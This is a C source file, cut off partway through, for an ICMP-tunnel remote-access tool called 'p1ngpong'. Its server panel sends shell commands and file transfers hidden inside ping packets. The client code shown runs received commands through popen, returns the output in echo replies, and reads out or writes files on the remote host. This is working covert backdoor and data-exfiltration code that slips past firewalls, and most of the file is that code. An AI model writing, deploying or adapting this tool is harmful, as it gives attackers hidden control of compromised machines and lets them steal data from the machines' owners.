//只有当ICMPheader内ID匹配且ICMP-DATA域完全一致才能判别两包由关联。
//echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>

#define PACKET_SIZE             4096
#define IPHDR_DEFAULT_LEN       20
#define ICMPHDR_LEN             8
#define ICMP_TIMESTAMP_LEN      8
#define ICMP_DATA_PRESERVE      8
#define ICMP_DATA_DEFAULT_LEN   48
#define ICMP_DATA_LEN           48

#define ICMP_UPLOAD             1
#define ICMP_DOWNLOAD           2
#define ICMP_SHELLCMD           3
#define ICMP_UPLOAD_RESULT      4
#define ICMP_DOWNLOAD_RESULT    5
#define ICMP_SHELLCMD_RESULT    6
#define USLEEP_TIME             400

struct sockaddr_in dest_addr;
uint16_t pid; 
struct sockaddr_in from;
struct timeval recvtime; 
char sendpacket[PACKET_SIZE];
char recvpacket[PACKET_SIZE];
uint8_t sockfd;

/*
struct st_p1ng{
    uint8_t type;
    uint8_t doneyet;
    uint8_t sequence_id;
    uint8_t payload_length ;//= ICMP_DATA_LEN - ICMP_DATA_PRESERVE - 3*2;
    uint8_t payload[ICMP_DATA_LEN - ICMP_DATA_PRESERVE];
} p1ng_data_structure;
*/

////////////////////////////////////////
//               TOOLS                //
////////////////////////////////////////

void print_logo(){
    printf("       _                                     \n");
    printf(" _ __ (_)_ __   __ _ _ __   ___  _ __   __ _ \n");
    printf("| '_ \\| | '_ \\ / _` | '_ \\ / _ \\| '_ \\ / _` |\n");
    printf("| |_) | | | | | (_| | |_) | (_) | | | | (_| |\n");
    printf("| .__/|_|_| |_|\\__, | .__/ \\___/|_| |_|\\__, |\n");
    printf("|_|            |___/|_|                |___/ \n");
    printf("                                   @aplyc1a  \n");
}

void print_usage(){
    printf("[shell    *] : execute linux shell command on the remote device.\n");
    printf("[upload   *] : upload file to the p1ng-server.\n");
    printf("[download *] : download file from the p1ng-server.\n");
}

unsigned short cal_chksum(unsigned short *addr, int len) {
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;
    /*把ICMP报头二进制数据以2字节为单位累加起来*/
    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }
    /*若ICMP报头为奇数个字节，会剩下最后一字节。把最后一个字节视为一个2字节数据的高字节，这个2字节数据的低字节为0，继续累加*/
    if (nleft == 1) {
        *(unsigned char *) (&answer) = *(unsigned char *) w;
        sum += answer;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return answer;
}

uint8_t pack(uint16_t pack_no) {
    uint8_t pack_size;
    struct icmp *icmp;
    struct timeval *tval;
    icmp = (struct icmp*) sendpacket;
    icmp->icmp_type = ICMP_ECHO;
    icmp->icmp_code = 0;
    icmp->icmp_cksum = 0;
    icmp->icmp_seq = pack_no;
    icmp->icmp_id = pid;
    pack_size = ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN;
    tval = (struct timeval *) icmp->icmp_data;
    gettimeofday(tval, NULL); /*记录发送时间*/
    icmp->icmp_cksum = cal_chksum((uint16_t *) icmp, pack_size); /*校验算法*/
    return pack_size;
}

uint8_t unpack(uint8_t *buf, uint8_t len) {
    uint8_t iphdrlen;
    struct ip *ip;
    struct icmp *icmp;
    struct timeval *tvsend;
    double rtt;
    ip = (struct ip *) buf;
    iphdrlen = ip->ip_hl << 2; /*ip报头的长度标志乘4求得ip报头长度*/
    icmp = (struct icmp *) (buf + iphdrlen); /*越过ip报头,指向ICMP报头*/
    len -= iphdrlen; /*ICMP报头及ICMP数据报的总长度*/
    if (len < 8) /*小于ICMP报头长度则不合理*/
    {
        printf("\033[40;33m[!]\033[0mICMP packet length too short!\n");
        return -1;
    }
    if ((icmp->icmp_type == ICMP_ECHOREPLY) && (icmp->icmp_id == pid)) {
        return 0;
    } else {
        return -1;
    }
    
}

uint8_t pack_p1ng(uint8_t pack_no, uint8_t *buf, uint8_t len, uint8_t icmp_type) {
    uint8_t pack_size;
    struct icmp *icmp;
    struct timeval *tval;
    icmp = (struct icmp*) sendpacket;
    icmp->icmp_type = icmp_type;
    icmp->icmp_code = 0;
    icmp->icmp_cksum = 0;
    icmp->icmp_seq = pack_no;
    icmp->icmp_id = pid;
    pack_size = ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN;
    tval = (struct timeval *) icmp->icmp_data;
    gettimeofday(tval, NULL);
    memcpy(sendpacket+ ICMP_TIMESTAMP_LEN + ICMPHDR_LEN + ICMP_DATA_PRESERVE, buf, len);
    icmp->icmp_cksum = cal_chksum((uint16_t *) icmp, pack_size);
    return pack_size;
}

uint8_t unpack_p1ng(uint8_t *buf, uint8_t len) {
    uint8_t iphdrlen;
    struct ip *ip;
    struct icmp *icmp;
    struct timeval *tvsend;
    double rtt;
    ip = (struct ip *) buf;
    iphdrlen = ip->ip_hl << 2; /*ip报头的长度标志乘4求得ip报头长度*/
    icmp = (struct icmp *) (buf + iphdrlen); /*越过ip报头,指向ICMP报头*/
    len -= iphdrlen; /*ICMP报头及ICMP数据报的总长度*/
    if (len < 8) /*小于ICMP报头长度则不合理*/
    {
        printf("\033[40;33m[!]\033[0mICMP packet length too short!\n");
        return -1;
    }
    /*确保所接收的是目标主机所发的的ICMP的回应*/
    if ((icmp->icmp_type == ICMP_ECHOREPLY) && (icmp->icmp_id == pid)) {
        printf("%s",buf+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+8+4);
    }
    return buf[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+8+1];
}

uint8_t p1ng_write_file(uint8_t *buf, uint8_t len, FILE *file) {
    uint8_t iphdrlen;
    struct ip *ip;
    struct icmp *icmp;
    struct timeval *tvsend;
    double rtt;
    uint8_t data_flag;
    ip = (struct ip *) buf;
    iphdrlen = ip->ip_hl << 2; 
    icmp = (struct icmp *) (buf + iphdrlen);
    len -= iphdrlen; /*ICMP报头及ICMP数据报的总长度*/
    if (len < 8)
    {
        printf("\033[40;33m[!]\033[0mICMP packet length too short!\n");
        return -1;
    }
    /*确保所接收的是目标主机所发的的ICMP的回应*/

    data_flag=buf[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+1];
    if(!data_flag){
        return 0;
    }
    
    if ((icmp->icmp_type == ICMP_ECHOREPLY) && (icmp->icmp_id == pid)) {//注意这里非常重要，涉及判别该包是否属于我们自己的包
        fwrite(buf+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+4,buf[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+8+3],1,file);
    }
    
    else if ((icmp->icmp_type == ICMP_ECHO)) {//注意这里非常重要，涉及判别该包是否属于我们自己的包
        fwrite(buf+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+4,buf[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+8+3],1,file);
    }
    
    else{
        printf("\033[40;33m[!]\033[0mDetected unsupport ICMP-type package!\n");
    }
    
    return buf[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+8+1];
}

uint8_t check_target(uint16_t seq_num) {
    uint8_t pkt_size;
    pkt_size = pack(seq_num);
    if( sendto(sockfd, sendpacket, pkt_size, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0){
		return 1;
    }
    sleep(1);
    pkt_size = recv(sockfd, recvpacket, sizeof(recvpacket), 0);
    if (unpack(recvpacket, pkt_size) == -1) {
        return 1;
    }else{
        return 0;
    }
}


////////////////////////////////////////
//         REQUEST & RESPONCE         //
////////////////////////////////////////

void regular_responcer(uint8_t *recvpkt, uint8_t recvpkt_len){
    uint8_t sendpkt[ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN]={0}; //该payload不含IPHDR
    struct icmp *recv_icmp, *send_icmp;
    unsigned long inaddr = 0l;
    struct ip *recv_ip;
    uint8_t iphdrlen;    
    recv_ip = (struct ip *) recvpkt;
    iphdrlen = (recv_ip->ip_hl)*4; /*ip报头的长度标志乘4求得ip报头长度*/
    recv_icmp = (struct icmp *) (recvpkt + iphdrlen); /*越过ip报头,指向ICMP报头*/
//拼包开始
    //ICMP头拼包
    send_icmp = (struct icmp*)sendpkt;
    memcpy(sendpkt,recvpkt+20,ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN);
    send_icmp->icmp_type = ICMP_ECHOREPLY;
    send_icmp->icmp_code = recv_icmp->icmp_code;
    send_icmp->icmp_cksum = 0;
    send_icmp->icmp_seq = recv_icmp->icmp_seq;
    send_icmp->icmp_id = recv_icmp->icmp_id;
    //ICMP头校验
    send_icmp->icmp_cksum = cal_chksum((uint16_t *) send_icmp, ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN); /*校验算法*/
    //修改回包IP
    inaddr = inet_addr(inet_ntoa(recv_ip->ip_src));
    memcpy((char *) &dest_addr.sin_addr, (char*)&inaddr,sizeof(inaddr));

    sendto(sockfd, sendpkt, ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));
}

void execute_responcer(uint8_t *recvpkt, uint8_t recvpkt_len){
    uint8_t sendpkt[ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN]={0}; //该payload不含IPHDR
    uint8_t iphdrlen;
    uint8_t pack_size;
    struct ip *recv_ip, *send_ip;
    struct icmp *recv_icmp, *send_icmp;
    struct timeval *tval;
    FILE *fp = NULL;
    uint8_t data[ICMP_DATA_LEN-ICMP_DATA_PRESERVE-4]={0};//4 为data域内的几个状态位
    recv_ip = (struct ip *) recvpkt;
    send_ip = (struct ip *) sendpkt;
    uint8_t seq_id=0,not_ok=1;
//预解析
    iphdrlen = (recv_ip->ip_hl)*4; /*ip报头的长度标志乘4求得ip报头长度*/
    recv_icmp = (struct icmp *) (recvpkt + iphdrlen); /*越过ip报头,指向ICMP报头*/
    pack_size = recvpkt_len - iphdrlen; /*ICMP报头及ICMP数据报的总长度*/
    if (pack_size < 8) /*小于ICMP报头长度则不合理*/
    {
        printf("\033[40;33m[!]\033[0mMalformed packet!\n");
        return ;
    }

//命令执行
    fp = popen(recvpkt+iphdrlen+28,"r");//28=24+4个校验位
    if(fp==NULL){
        printf("\033[40;31m[-]\033[0m popen error!\n");
    }
    while(fgets(data,sizeof(data),fp)!=NULL){
        seq_id++;
//拼包开始
        //ICMP头拼包
        send_icmp = (struct icmp*)sendpkt;
        send_icmp->icmp_type = ICMP_ECHOREPLY;
        send_icmp->icmp_code = recv_icmp->icmp_code;
        send_icmp->icmp_cksum = 0;
        send_icmp->icmp_seq = recv_icmp->icmp_seq;
        send_icmp->icmp_id = recv_icmp->icmp_id;
        pack_size = ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN;
		//拷贝ICMP时间戳
        memcpy(sendpkt+ICMPHDR_LEN,recvpkt+iphdrlen+ICMPHDR_LEN,ICMP_TIMESTAMP_LEN);
		//拷贝ICMP数据区的8位保留数据
        memcpy(sendpkt+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN,recvpkt+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN,ICMP_DATA_PRESERVE);
        memcpy(send_icmp->icmp_data,recv_icmp->icmp_data,ICMP_DATA_PRESERVE);
		
        //ICMP DATA域核心部分
        (void)snprintf(sendpkt + ICMPHDR_LEN + ICMP_TIMESTAMP_LEN +  ICMP_DATA_PRESERVE,
               ICMP_DATA_LEN-8, "%c%c%c%c%s", ICMP_SHELLCMD_RESULT, not_ok, seq_id, (uint8_t)strlen(data), data);
        //ICMP头校验
        send_icmp->icmp_cksum = cal_chksum((uint16_t *) send_icmp, pack_size); /*校验算法*/
//发送回包
        sendto(sockfd, sendpkt, ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN, 
               0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));
    }
//构造并发送尾包
    not_ok=0;
    send_icmp = (struct icmp*)sendpkt;
    send_icmp->icmp_type = ICMP_ECHOREPLY;
    send_icmp->icmp_code = recv_icmp->icmp_code;
    send_icmp->icmp_cksum = 0;
    send_icmp->icmp_seq = recv_icmp->icmp_seq;
    send_icmp->icmp_id = recv_icmp->icmp_id;
    pack_size = ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN;
	//拷贝ICMP时间戳
    memcpy(sendpkt+ICMPHDR_LEN,recvpkt+iphdrlen+ICMPHDR_LEN,ICMP_TIMESTAMP_LEN);
    //拷贝ICMP数据区的8位保留数据
    memcpy(sendpkt+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN,recvpkt+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN,ICMP_DATA_PRESERVE);
    memcpy(send_icmp->icmp_data,recv_icmp->icmp_data,ICMP_DATA_PRESERVE);
    //ICMP DATA域核心部分
    (void)snprintf(sendpkt+ ICMP_TIMESTAMP_LEN + ICMPHDR_LEN + ICMP_DATA_PRESERVE,
          ICMP_DATA_LEN-8, "%c%c%c%c%s", ICMP_SHELLCMD_RESULT, not_ok, ++seq_id, (uint8_t)strlen(""), "");
    //ICMP头校验
    send_icmp->icmp_cksum = cal_chksum((uint16_t *) send_icmp, pack_size); /*校验算法*/
//发送回包
    sendto(sockfd, sendpkt, ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN, 
           0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));

}

void upload_responcer(uint8_t *recvpkt, uint8_t recvpkt_len){
    uint8_t sendpkt[ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN]={0}; //该payload不含IPHDR
	uint8_t filename[50];
    uint8_t iphdrlen;
    uint8_t pack_size;
    struct ip *recv_ip, *send_ip;
    struct icmp *recv_icmp, *send_icmp;
    struct timeval *tval;
    uint8_t data[ICMP_DATA_LEN-ICMP_DATA_PRESERVE-4]={0};//4 为data域内的几个状态位
    uint8_t seq_id=0,not_ok=1;
    uint8_t ret=0;
	
//预解析
    recv_ip = (struct ip *) recvpkt;
    send_ip = (struct ip *) sendpkt;
    iphdrlen = (recv_ip->ip_hl)*4; /*ip报头的长度标志乘4求得ip报头长度*/
    recv_icmp = (struct icmp *) (recvpkt + iphdrlen); /*越过ip报头,指向ICMP报头*/
    pack_size = recvpkt_len - iphdrlen; /*ICMP报头及ICMP数据报的总长度*/
    if (pack_size < 8) /*小于ICMP报头长度则不合理*/
    {
        printf("\033[40;33m[!]\033[0mMalformed packet!\n");
        return ;
    }
	strncpy(filename,recvpkt+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+4,recvpkt_len);
    FILE *fp = fopen(filename,"r");
    if(fp==NULL){
        printf("\033[40;31m[-]\033[0mfopen error!\n");
    }

    //构建文件包并发送
    while(!feof(fp)){
        usleep(USLEEP_TIME);
        seq_id++;		
        ret=fread(data, 1, sizeof(data)-1, fp);

        //ICMP HEADER
        send_icmp = (struct icmp*)sendpkt;
        send_icmp->icmp_type = ICMP_ECHOREPLY;
        send_icmp->icmp_code = recv_icmp->icmp_code;
        send_icmp->icmp_cksum = 0;
        send_icmp->icmp_seq = recv_icmp->icmp_seq;
        send_icmp->icmp_id = recv_icmp->icmp_id;
        pack_size = ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN;
		//拷贝ICMP时间戳
        memcpy(sendpkt+ICMPHDR_LEN,recvpkt+iphdrlen+ICMPHDR_LEN,ICMP_TIMESTAMP_LEN);
		//拷贝ICMP数据区的8位保留数据
        memcpy(sendpkt+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN,recvpkt+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN,ICMP_DATA_PRESERVE);
        memcpy(send_icmp->icmp_data,recv_icmp->icmp_data,ICMP_DATA_PRESERVE);
        //ICMP DATA域拼包
        (void)snprintf(sendpkt+ ICMP_TIMESTAMP_LEN + ICMPHDR_LEN + ICMP_DATA_PRESERVE,
               5, "%c%c%c%c", ICMP_UPLOAD_RESULT, not_ok, seq_id, ret);
        memcpy(sendpkt+ ICMP_TIMESTAMP_LEN + ICMPHDR_LEN + ICMP_DATA_PRESERVE+4,data,sizeof(data)-1);
        //ICMP头校验
        send_icmp->icmp_cksum = cal_chksum((uint16_t *) send_icmp, pack_size); /*校验算法*/
        
		//发送回包

        sendto(sockfd, sendpkt, ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN, 
               0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));
        memset(data,'\0',sizeof(data));
        memset(sendpkt,'\0',sizeof(sendpkt));
    }
    

//构造并发送尾包
    not_ok=0;
    seq_id++;
	//ICMP HEADER拼包
    send_icmp = (struct icmp*)sendpkt;
    send_icmp->icmp_type = ICMP_ECHOREPLY;
    send_icmp->icmp_code = recv_icmp->icmp_code;
    send_icmp->icmp_cksum = 0;
    send_icmp->icmp_seq = recv_icmp->icmp_seq;
    send_icmp->icmp_id = recv_icmp->icmp_id;
    pack_size = ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN;
    //拷贝ICMP时间戳
    memcpy(sendpkt+ICMPHDR_LEN,recvpkt+iphdrlen+ICMPHDR_LEN,ICMP_TIMESTAMP_LEN);
    //拷贝ICMP数据区的8位保留数据
    memcpy(sendpkt+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN,recvpkt+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN,ICMP_DATA_PRESERVE);
    memcpy(send_icmp->icmp_data,recv_icmp->icmp_data,ICMP_DATA_PRESERVE);
    
    (void)snprintf(sendpkt+ ICMP_TIMESTAMP_LEN + ICMPHDR_LEN + ICMP_DATA_PRESERVE,
          ICMP_DATA_LEN-8, "%c%c%c%c%s", ICMP_UPLOAD_RESULT, not_ok, seq_id, (uint8_t)strlen(""), "");
    //ICMP头校验
    send_icmp->icmp_cksum = cal_chksum((uint16_t *) send_icmp, pack_size); /*校验算法*/
//发送回包
    sendto(sockfd, sendpkt, ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN, 
           0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));
}

void download_responcer(uint8_t *recvpkt, uint8_t recvpkt_len){
    uint8_t sendpkt[ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN]={0}; //该payload不含IPHDR
    uint8_t recvpacket[IPHDR_DEFAULT_LEN+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN];//含有IPHDR
    uint8_t iphdrlen;
    struct icmp *icmp;
    uint8_t send_doneyet=1,recv_doneyet=1;
    uint8_t count = 0;
    uint8_t filename[50]={0};
    uint8_t pkt_size=recvpkt_len;
    struct ip *recv_ip, *send_ip;
    struct icmp *recv_icmp, *send_icmp;
    time_t t;
    time(&t);
    uint8_t pack_size;
    struct tm *tmp_time=localtime(&t);
    strftime(filename,sizeof(filename),"%04Y%02m%02d%H%M%S.p1ng",tmp_time);
    FILE *fp = fopen(filename, "wb");
    
    if(fp == NULL)
    {
        printf("\033[40;31m[-]\033[0mfopen error!\n");
        return ;
    }
    
    recv_doneyet = p1ng_write_file(recvpkt, pkt_size, fp);
    memcpy(recvpacket,recvpkt,pkt_size);
    while(recv_doneyet){
        regular_responcer(recvpacket,pkt_size);
        pkt_size = recv(sockfd, recvpacket, sizeof(recvpacket), 0);
        recv_doneyet = p1ng_write_file(recvpacket, pkt_size-8, fp);    
        count++;
    }
    fclose(fp);
	
    //拼接并发送尾包通知
    recv_ip = (struct ip *) recvpacket;
    iphdrlen = recv_ip->ip_hl << 2; 
    recv_icmp = (struct icmp *) (recvpkt + iphdrlen); 
    send_ip = (struct ip *) sendpkt;    
    send_icmp = (struct icmp*)sendpkt;
    send_icmp->icmp_type = ICMP_ECHOREPLY;
    send_icmp->icmp_code = recv_icmp->icmp_code;
    send_icmp->icmp_cksum = 0;
    send_icmp->icmp_seq = recv_icmp->icmp_seq;
    send_icmp->icmp_id = recv_icmp->icmp_id;
    pack_size = ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN;
    //拷贝ICMP时间戳
    memcpy(sendpkt+ICMPHDR_LEN,recvpkt+iphdrlen+ICMPHDR_LEN,ICMP_TIMESTAMP_LEN);
    //拷贝ICMP数据区的8位保留数据
    memcpy(sendpkt+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN,recvpkt+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN,ICMP_DATA_PRESERVE);
    memcpy(send_icmp->icmp_data,recv_icmp->icmp_data,ICMP_DATA_PRESERVE);
    (void)snprintf(sendpkt+ ICMP_TIMESTAMP_LEN + ICMPHDR_LEN + ICMP_DATA_PRESERVE, 5, 
	    "%c%c%c%c", ICMP_DOWNLOAD_RESULT, 0, count, (uint8_t)strlen(filename));//拷贝数据区p1ng4字节标志位
    memcpy(sendpkt+ ICMP_TIMESTAMP_LEN + ICMPHDR_LEN + ICMP_DATA_PRESERVE+4,filename,strlen(filename)); //剩余位置拷入本地文件名  
    send_icmp->icmp_cksum = cal_chksum((uint16_t *) send_icmp, pack_size);
    if( sendto(sockfd, sendpkt, ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0){
        printf("\033[40;31m[-]\033[0msendto error!\n");
    }

}

void execute_requester(uint8_t *cmd, uint16_t seq_num){
    uint8_t pkt_size;
    uint8_t payload[ICMP_DATA_LEN];
    uint8_t send_doneyet=1,recv_doneyet=1;
    uint8_t count = 0;
    if(strlen(cmd)<=1){
        printf("\033[40;33m[!]\033[0m shellcmd(%s) seems to be wrong, please check again!\n", cmd);
        return ;
    }
    while(send_doneyet){
        count++;
        (void)snprintf(payload, ICMP_DATA_LEN-8, "%c%c%c%c%s", ICMP_SHELLCMD, send_doneyet, count, (uint8_t)strlen(cmd), cmd);
        pkt_size = pack_p1ng(seq_num, payload, strlen(payload), ICMP_ECHO);
        if( sendto(sockfd, sendpacket, pkt_size, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0){
            printf("\033[40;31m[-]\033[0msendto error!\n");
        }
        send_doneyet=0;
		memset(sendpacket,0,sizeof(sendpacket));
    }
    while(recv_doneyet){
        pkt_size = recv(sockfd, recvpacket, sizeof(recvpacket), 0);
        recv_doneyet=unpack_p1ng(recvpacket, pkt_size);
    }

}

void upload_requester(uint8_t *cmd, uint16_t seq_num){
    uint8_t pkt_size;
    uint8_t payload[ICMP_DATA_LEN];
    uint8_t send_doneyet=1,recv_doneyet=1;
    uint8_t count = 0;
    uint8_t filename[50];
	
    time_t t;
    time(&t);
    struct tm *tmp_time=localtime(&t);
    strftime(filename,sizeof(filename),"%04Y%02m%02d%H%M%S.p1ng",tmp_time);
	
    if(strlen(cmd)<=1){
        printf("\033[40;33m[!]\033[0m filename(%s) seems to be wrong, please check again!\n", cmd);
        return ;
    }
    FILE *fp = fopen(filename, "wb");
    if(fp == NULL)
    {
        printf("\033[40;31m[-]\033[0mfopen error!\n");
        return ;
    }
    while(send_doneyet){//@todo 这里只是一个假的循环，后面为长文件名提供支持。
        count++;
		//文件名不含00,直接用字符串拷贝之。
        (void)snprintf(payload, ICMP_DATA_LEN-8, "%c%c%c%c%s", ICMP_UPLOAD, send_doneyet, count, (uint8_t)strlen(cmd), cmd);
        pkt_size = pack_p1ng(seq_num, payload, strlen(payload), ICMP_ECHO);
        if( sendto(sockfd, sendpacket, pkt_size, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0){
            printf("\033[40;31m[-]\033[0msendto error!\n");
        }
        send_doneyet=0;
		memset(sendpacket,0,sizeof(sendpacket));
    }

    while(recv_doneyet){
        pkt_size = recv(sockfd, recvpacket, sizeof(recvpacket), 0);
        recv_doneyet = p1ng_write_file(recvpacket, pkt_size, fp);
    }
    printf("\033[40;36m[*]\033[0mUpload completed. Local filename: \033[40;36m%s\033[0m\n", filename);
    fclose(fp);
}

void download_requester(uint8_t *cmd, uint16_t seq_num){
    uint8_t pkt_size;
    uint8_t payload[ICMP_DATA_LEN];
    uint8_t send_doneyet=1,recv_doneyet=1;
    uint8_t count = 0;
    uint8_t data[ICMP_DATA_LEN-8-4]={0};//4 为data域内的几个状态位
    uint8_t iphdrlen;
    struct ip *recv_ip;
    uint8_t filename[50];
    uint8_t ret=0;


    if(strlen(cmd)<=1){
        printf("\033[40;33m[!]\033[0m Filename(%s) seems to be wrong, please check again!\n", cmd);
        return ;
    }

    FILE *fp = fopen(cmd,"r");
    if(fp==NULL){
        printf("\033[40;31m[-]\033[0mfopen error!\n");
		return;
    }

    //发送文件
    while(!feof(fp)){
		count++;
        ret=fread(data, 1, sizeof(data)-1, fp);
		//组包,p1ng标记位占了4字节
        (void)snprintf(payload, 5, "%c%c%c%c", ICMP_DOWNLOAD, send_doneyet, count, ret);
        memcpy(payload+4,data,ret);
        pkt_size = pack_p1ng(seq_num, payload, ret+4, ICMP_ECHO);
		
        if( sendto(sockfd, sendpacket, pkt_size, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0){
            printf("\033[40;31m[-]\033[0msendto error!\n");
        }
		//临时清缓存
        memset(data,0,sizeof(data));
        memset(payload,0,sizeof(payload));
        memset(sendpacket,0,sizeof(sendpacket));
		usleep(USLEEP_TIME);
    }
    fclose(fp);	
	
    //构造并发送尾包
    send_doneyet=0;
    (void)snprintf(payload, 5, "%c%c%c%c", ICMP_DOWNLOAD, send_doneyet, count, 0);
    memcpy(payload+4,data,sizeof(data)-1);
    pkt_size = pack_p1ng(seq_num, payload, ICMP_DATA_LEN-8, ICMP_ECHO);
    if( sendto(sockfd, sendpacket, pkt_size, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0){
        printf("\033[40;31m[-]\033[0msendto error!\n");
    }

    while(recv_doneyet){
        pkt_size = recv(sockfd, recvpacket, sizeof(recvpacket), 0);
        recv_ip = (struct ip *) recvpacket;
        iphdrlen = recv_ip->ip_hl << 2;
        recv_doneyet = recvpacket[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+8+1];
        if(!recv_doneyet)
            strncpy(filename,recvpacket+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+8+4,recvpacket[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+8+3]);
            filename[recvpacket[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+8+3]]='\0';
    }
    printf("\033[40;36m[*]\033[0mDownload completed. Remote filename: \033[40;36m%s\033[0m\n", filename);

}

////////////////////////////////////////
//            p1ng cs panel           //
////////////////////////////////////////

void p1ng_server(char *client_ip){
    struct hostent *host;
    struct protoent *protocol;
    unsigned long inaddr = 0l;
    uint32_t size = 50 * 1024;
    uint16_t count = 1;
    if ((protocol = getprotobyname("icmp")) == NULL)
    {
        perror("getprotobyname error");
        exit(1);
    }
    /*生成使用ICMP的原始套接字*/
    if ((sockfd = socket(AF_INET, SOCK_RAW, protocol->p_proto)) < 0) /*函数socket()在<sys/socket.h>中定义，int socket(int domain, int type, int protocol);*/
    {
        perror("socket error");
        exit(1);
    }
    setuid(getuid());
    setsockopt(sockfd, SOL_SOCKET, SO_RCVBUF, &size, sizeof(size));
    bzero(&dest_addr, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    /*判断是主机名还是ip地址*/
    if ((inaddr = inet_addr(client_ip)) == INADDR_NONE)
    {
        if ((host = gethostbyname(client_ip)) == NULL) {//注意这里的括号，反复错了多次。
            perror("gethostbyname error");
            exit(1);
        }
        /*是主机名*/
        memcpy((char *) &dest_addr.sin_addr, host->h_addr, host->h_length);
    } else {
        /*是IP地址*/
        memcpy((char *) &dest_addr.sin_addr, (char*)&inaddr,sizeof(inaddr));
    }
    /*设置ICMP的标志符*/
    pid = getpid();
    if(check_target(count)){
        printf("\033[40;31m[-]\033[0mTarget(%s) unreachable!\n", client_ip);
        exit(0);
    }
    print_logo();
    char p1ngcmd[100];
    int status=0;
    while(1){
        count++;
        printf("\033[40;32mp1ng$>\033[0m");
        fgets(p1ngcmd,50-1,stdin);
        p1ngcmd[strlen(p1ngcmd)-1]='\0';
        if(strncmp(p1ngcmd,"shell ",6) == 0){
            execute_requester(p1ngcmd+6, count);
        } else if(strncmp(p1ngcmd,"upload ",7) == 0){
            upload_requester(p1ngcmd+7, count);
        } else if(strncmp(p1ngcmd,"download ",9) == 0){
            download_requester(p1ngcmd+9, count);
        } else if((strcmp(p1ngcmd,"help") == 0)){
            print_usage();
            continue;
        } else if (strcmp(p1ngcmd,"\0") ==0){
            continue;
        } else {
            printf("\033[40;33m[!]\033[0munknow command! %c%c%c..\n",p1ngcmd[0],p1ngcmd[1],p1ngcmd[2]);
            continue;
        }
        
    }
}

void p1ng_client(){
    struct protoent *protocol;
    uint8_t iphdr_len = 0;
    uint8_t icmptotal_len= 0;
    uint8_t recvpacket[IPHDR_DEFAULT_LEN+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN];
